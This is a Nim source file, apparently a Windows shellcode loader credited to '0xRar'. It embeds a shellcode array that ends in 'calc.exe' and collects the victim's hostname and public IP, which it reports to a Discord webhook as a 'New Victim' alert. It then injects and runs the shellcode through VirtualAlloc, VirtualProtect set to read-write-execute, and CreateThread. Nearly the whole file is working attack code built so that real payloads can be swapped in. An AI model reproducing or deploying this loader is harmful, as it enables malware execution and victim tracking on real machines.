import json
import strformat
import httpclient
import winim/com

# Your shellcode
var sh: array[276, byte] = [
byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,
0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,
0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,
0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
0x00]
var sh_size = cast[SIZE_T](sizeof(sh))


proc banner() =
  echo """
  ┳┓•     ┏┓┓   ┓┓    ┓    ┓      ┓
  ┃┃┓┏┳┓  ┗┓┣┓┏┓┃┃┏┏┓┏┫┏┓  ┃ ┏┓┏┓┏┫┏┓┏┓
  ┛┗┗┛┗┗  ┗┛┛┗┗ ┗┗┗┗┛┗┻┗   ┗┛┗┛┗┻┗┻┗ ┛
  👑 By 0xRar
  """


proc webhook_callback(hostname: cstring) =
  # Your Discord Webhook
  const webhook_url = "https://discord.com/api/webhooks/UR_WEBHOOK"
  # Starting an http client
  var client = newHttpClient()
  client.headers = newHttpHeaders({"Content-Type": "application/json"})

  # Getting victim IP
  var 
    ipGet = client.get("https://httpbin.org/ip")
    ipData = parseJson(ipGet.body)
    ipAddr = ipData["origin"].getStr()

  var 
    content = fmt"""
    Victim IP: `{ipAddr}`
    Victim Hostname: `{hostname}`
    """
    message = %* { 
      "embeds": [
        {
          "title": "[+] New Victim",
          "description": content,
          "color": 16711680
        },
      ]
    }
    msg_content = $message

  try:
    let response = client.post(webhook_url, body=msg_content)

    # Checking response
    if response.status == $Http204:
      echo fmt"[+] Sent a request to the webhook"
    else:
      echo "[-] Failed to send a request to the webhook, Status: ", response.status 
      echo response.body

  except HttpRequestError as e:
    echo "HTTP request failed: ", e.msg

  finally:
    client.close()


proc main() =
  # Get computer name / hostname, in order to use it in the webhook output
  var
    computerName: array[MAX_COMPUTERNAME_LENGTH + 1, char]
    cSize = sizeof(computerName)
    hostname: cstring = ""

  if GetComputerNameA(cast[LPSTR](addr computerName[0]), cast[LPDWORD](addr cSize)):
    hostname = cast[cstring](addr computerName[0])
  else:
    echo "Failed to get computer name: ", GetLastError()

  webhook_callback(hostname)

  # // ---- Injecting shellcode ---- //

  # Allocating memory
  var exec_mem = VirtualAlloc(
    NULL,
    sh_size,
    MEM_COMMIT or MEM_RESERVE,
    PAGE_READWRITE
  )
  echo "[+] Allocated Memory Buffer: ", repr(exec_mem)

  var oldprotect: DWORD = 0
  if VirtualProtect(exec_mem, sh_size, PAGE_EXECUTE_READWRITE, addr oldprotect) == False:
    echo "Failed to change the memory protection, Error Code: ", GetLastError()

  echo "[+] Changed Memory Protection To Read-Write-Execute" 

  copyMem(exec_mem, addr(sh), sh_size)

  # Creating the thread to run our payload
  let hThread = CreateThread(
    NULL,
    0,
    cast[LPTHREAD_START_ROUTINE](exec_mem),
    NULL,
    0,
    NULL
  )
  echo "[+] Created An Execution Thread"
  echo "[+] Calc Pop?"

  if VirtualFree(exec_mem, 0, MEM_RELEASE) == 0:
    echo  "[-] Failed to free memory, Error Code: ", GetLastError()
  else:
    echo "[+] The Allocated Memory Buffer Successfuly Freed"

  WaitForSingleObject(hThread, INFINITE)
  CloseHandle(hThread)

banner()
main()
